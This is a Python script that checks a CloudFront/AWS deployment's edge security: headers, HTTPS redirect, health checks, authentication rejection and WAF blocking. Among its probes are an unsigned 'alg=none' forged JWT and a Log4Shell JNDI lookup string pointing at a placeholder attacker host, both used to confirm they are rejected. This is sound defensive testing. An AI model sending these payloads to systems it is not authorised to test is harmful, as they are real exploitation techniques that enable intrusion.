"""LIVE edge checks through the public CloudFront URL (no credentials needed; nothing is modified).

Usage: uv run python scripts/verify_aws_edge.py https://<distribution>.cloudfront.net
Writes var/verification/edge.json.
"""

from __future__ import annotations

import json
import sys
from datetime import UTC, datetime
from pathlib import Path

import httpx


def main(base: str) -> None:
    base = base.rstrip("/")
    results: list[dict[str, str]] = []

    def ok(name: str, passed: bool, evidence: str) -> None:
        results.append({"check": name, "status": "PASS" if passed else "FAIL", "evidence": evidence})
        print(f"{'PASS' if passed else 'FAIL'}  {name} — {evidence}")

    with httpx.Client(timeout=20, follow_redirects=False) as c:
        r = c.get(base + "/")
        ok(
            "SPA served from private S3 via CloudFront (OAC)",
            r.status_code == 200 and '<div id="root">' in r.text,
            f"HTTP {r.status_code}",
        )
        h = {k.lower(): v for k, v in r.headers.items()}
        want = [
            "strict-transport-security",
            "content-security-policy",
            "x-content-type-options",
            "x-frame-options",
            "referrer-policy",
        ]
        ok("Security headers on SPA", all(k in h for k in want), ", ".join(k for k in want if k in h))
        r = httpx.get(base.replace("https://", "http://") + "/", follow_redirects=False, timeout=20)
        ok("Plain HTTP redirected to HTTPS", r.status_code in (301, 302, 307, 308), f"HTTP {r.status_code}")
        r = c.get(base + "/healthz")
        ok(
            "API reachable: CloudFront → VPC origin → internal ALB → ECS",
            r.status_code == 200,
            f"HTTP {r.status_code}",
        )
        r = c.get(base + "/readyz")
        ok(
            "API readiness: OpenSearch (SigV4/FGAC) + DynamoDB",
            r.status_code == 200 and r.json()["checks"] == {"opensearch": "ok", "dynamodb": "ok"},
            r.text[:100],
        )
        ok(
            "Trace id returned on every response",
            "x-trace-id" in {k.lower() for k in r.headers},
            "X-Trace-Id present",
        )
        r = c.post(base + "/api/ask", json={"question": "x"})
        ok("No token → 401", r.status_code == 401, f"HTTP {r.status_code}")
        r = c.post(
            base + "/api/ask",
            json={"question": "x"},
            headers={"Authorization": "Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJ4In0."},
        )
        ok("Forged alg=none token → 401", r.status_code == 401, f"HTTP {r.status_code}")
        r = c.get(base + "/api/citations/chk_" + "0" * 32)
        ok("Citation endpoint requires authentication", r.status_code == 401, f"HTTP {r.status_code}")
        r = c.get(base + "/dev-idp/users")
        ok(
            "Development IdP not mounted in AWS",
            r.status_code in (403, 404) and "synthetic" not in r.text,
            f"HTTP {r.status_code}",
        )
        r = c.get(base + "/api/docs")
        ok("Interactive API docs disabled outside local", r.status_code == 404, f"HTTP {r.status_code}")
        r = c.get(base + "/api/me", headers={"X-Api-Version": "${jndi:ldap://evil.example/a}"})
        ok("WAF blocks known-bad input (Log4Shell probe)", r.status_code == 403, f"HTTP {r.status_code}")

    out = Path("var/verification")
    out.mkdir(parents=True, exist_ok=True)
    (out / "edge.json").write_text(
        json.dumps({"base": base, "checked_at": datetime.now(UTC).isoformat(), "results": results}, indent=2)
    )
    print(f"\n{sum(x['status'] == 'PASS' for x in results)}/{len(results)} PASS")


if __name__ == "__main__":
    main(sys.argv[1])
